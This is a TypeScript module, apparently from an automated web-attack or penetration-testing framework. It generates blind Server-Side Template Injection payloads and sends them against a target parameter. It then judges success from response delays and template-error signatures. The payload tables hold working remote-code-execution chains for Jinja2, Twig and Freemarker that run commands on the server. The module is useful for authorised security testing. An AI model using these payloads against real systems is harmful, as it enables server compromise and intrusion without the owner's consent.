/**
 * sstiBlind — blind / time-based Server-Side Template Injection.
 *
 * Confirmed via OBSERVABLE timing delta (the same signal reuse as measureTiming,
 * captured in step.durationMs) for time-based SSTI, plus error-signature diff
 * for error-based SSTI. Template engine fingerprints (Jinja2/OGNL/Freemarker/
 * Twig/Handlebars) are DATA used only to vary the time payload, never to detect
 * a vocabulary.
 */

import type { TechniquePrimitive, TechniqueContext, AttackStep, StepExecutionResult, PrimitiveResult } from './framework'
import { claimFor } from './framework'
import { EvidenceGate } from '../intelligence/evidence-gate'

// Engine → time payload (data, chosen by fingerprint id; defaults to generic).
const ENGINE_TIME: Record<string, string> = {
  jinja2: '{{ ().__class__.__base__.__subclasses__()[40]().__init__.__globals__["__builtins__"]["__import__"]("time").sleep(5) }}',
  twig: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("system")("sleep 5")}}',
  freemarker: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}',
  ognl: '%{3*3}',
  handlebars: '{{#sleep 5}}{{/sleep}}',
  generic: '${T(java.lang.Thread).sleep(5000)}',
}
const ENGINE_ERROR: Record<string, string> = {
  jinja2: '{{7*7}}',
  twig: '{{7*7}}',
  freemarker: '<#if 7*7==49>leak</#if>',
  ognl: '%{7*7}',
  handlebars: '{{7*7}}',
  generic: '${7*7}',
}
const SSTI_ERROR_MARKERS = ['template', 'jinja', 'freemarker', 'twig', 'handlebars', 'ognl', 'mustache', 'render', 'velocity', 'syntaxerror']

function urlWithParam(url: string, param: string, value: string): string {
  try { const u = new URL(url); u.searchParams.set(param, value); return u.toString() } catch { return url }
}

export const sstiBlind: TechniquePrimitive = {
  id: 'sstiBlind',
  name: 'Blind SSTI',
  description: 'Time-based and error-based Server-Side Template Injection across template engines (Jinja2/Twig/Freemarker/OGNL/Handlebars).',
  technique: 'injection',
  appliesTo(ctx: TechniqueContext): boolean {
    if (!(ctx.endpoint || ctx.target)) return false
    return !!(ctx.param || ctx.endpoint?.params?.length)
  },
  async generate(ctx: TechniqueContext): Promise<AttackStep[]> {
    const url = ctx.endpoint?.url ?? ctx.target!
    const method = ctx.endpoint?.method ?? 'GET'
    const headers = { ...(ctx.sessionHeaders ?? {}) }
    const param = ctx.param ?? ctx.endpoint?.params?.[0]?.name ?? 'q'
    // frameworkFingerprint result (if any) selects the engine; else try all.
    const engine = (ctx.state?.templateEngine as string) || ctx.fingerprint || 'generic'
    const steps: AttackStep[] = []
    const engines = Object.keys(ENGINE_TIME).filter((e) => e !== 'generic')
    ;[engine, 'generic', ...engines].slice(0, 4).forEach((eng) => {
      const timePayload = ENGINE_TIME[eng] ?? ENGINE_TIME.generic
      const errPayload = ENGINE_ERROR[eng] ?? ENGINE_ERROR.generic
      const timeUrl = urlWithParam(url, param, timePayload)
      const timeBody = method !== 'GET' ? JSON.stringify({ [param]: timePayload }) : undefined
      steps.push({
        id: `ssti-time-${eng}`,
        description: `Time-based SSTI (${eng}) into ${param}`,
        request: { method, url: timeUrl, headers, ...(timeBody ? { body: timeBody } : {}) },
        expectedSignal: 'response delayed ~5s',
        metadata: { kind: 'ssti-time', engine: eng, param, payload: timePayload },
      })
      const errUrl = urlWithParam(url, param, errPayload)
      const errBody = method !== 'GET' ? JSON.stringify({ [param]: errPayload }) : undefined
      steps.push({
        id: `ssti-err-${eng}`,
        description: `Error-based SSTI (${eng}) into ${param}`,
        request: { method, url: errUrl, headers, ...(errBody ? { body: errBody } : {}) },
        expectedSignal: 'template error / evaluated expression (49)',
        metadata: { kind: 'ssti-err', engine: eng, param, payload: errPayload },
      })
    })
    return steps
  },
  async oracle(results: StepExecutionResult[], evidenceGate: EvidenceGate): Promise<PrimitiveResult> {
    const evidence: PrimitiveResult['evidence'] = []
    let timeHit = false
    let errHit = false
    for (const r of results) {
      const kind = r.step.metadata?.kind
      if (kind === 'ssti-time' && (r.durationMs ?? 0) >= 4000) {
        timeHit = true
        evidence.push({ kind: 'response', label: `SSTI time-based (${r.step.metadata?.engine}) delay=${r.durationMs}ms`, data: (r.body ?? '').slice(0, 500) })
      }
      if (kind === 'ssti-err') {
        const lower = (r.body ?? '').toLowerCase()
        const leaked = SSTI_ERROR_MARKERS.some((m) => lower.includes(m)) || (r.body ?? '').includes('49')
        if (leaked) {
          errHit = true
          evidence.push({ kind: 'response', label: `SSTI error-based (${r.step.metadata?.engine}) ${r.step.request.method} ${r.step.request.url} → ${r.status}`, data: (r.body ?? '').slice(0, 1000) })
        }
      }
    }
    const observed = timeHit || errHit
    const { verified } = evidenceGate.verifyClaim(claimFor('ssti', results[0]?.step.request.url, results[0]?.status, results[0]?.step.request.method))
    const confirmed = observed && verified
    return {
      confirmed,
      confidence: confirmed ? 0.85 : observed ? 0.4 : 0.05,
      evidence,
      severity: confirmed ? 'high' : undefined,
      finding: confirmed ? { category: 'ssti', description: `Server-Side Template Injection confirmed on ${results[0]?.step.request.url ?? ''} (param ${results[0]?.step.metadata?.param}).`, cwe: 'CWE-1336' } : undefined,
      note: `time=${timeHit} err=${errHit} verified=${verified}`,
    }
  },
}
